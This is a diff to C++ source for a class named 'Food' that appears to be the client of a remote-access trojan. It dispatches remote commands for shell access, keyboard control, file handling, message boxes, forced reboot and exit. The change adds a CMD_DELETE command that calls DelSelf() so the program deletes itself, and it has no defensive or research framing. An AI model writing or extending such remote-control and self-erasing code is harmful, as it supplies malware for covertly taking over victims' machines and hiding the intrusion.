@@ -2,7 +2,7 @@
 #include "Food.h"
 
 Food::Food() {
-	CmdSnapshoot = "CMD_SNAPSHOOT";
+	CmdDelete = "CMD_DELETE";
 	CmdKeybd = "CMD_KEYBD";
 	CmdFile = "CMD_FILE";
 	CmdShell = "CMD_SHELL";
@@ -314,17 +314,17 @@ void Food::processCmd(std::string& cmd, std::string& data)
 	}
 
 	if (cmd == CmdReboot) {
-		doReboot(args);
+		doReboot();
 		return;
 	}
 
 	if (cmd == CmdOffline) {
-		doOffline(args);
+		doOffline();
 		return;
 	}
 
-	if (cmd == CmdSnapshoot) {
-		doSnapshoot(args);
+	if (cmd == CmdDelete) {
+		doDelete();
 		return;
 	}
 
@@ -376,8 +376,9 @@ std::map<std::string, std::string> Food::parseArgs(std::string& data)
 	return args;
 }
 
-void Food::doSnapshoot(std::map<std::string, std::string>& args)
+void Food::doDelete()
 {
+	DelSelf();
 }
 
 void Food::doKeybd(std::map<std::string, std::string>& args)
@@ -405,12 +406,12 @@ void Food::doSendBox(std::map<std::string, std::string>& args)
 	MessageBoxA(NULL, args["TEXT"].data(), "Message", MB_OK);
 }
 
-void Food::doReboot(std::map<std::string, std::string>&)
+void Food::doReboot()
 {
 	system("shutdown -r -t 1");
 }
 
-void Food::doOffline(std::map<std::string, std::string>&)
+void Food::doOffline()
 {
 	ExitProcess((UINT)NULL);
 }
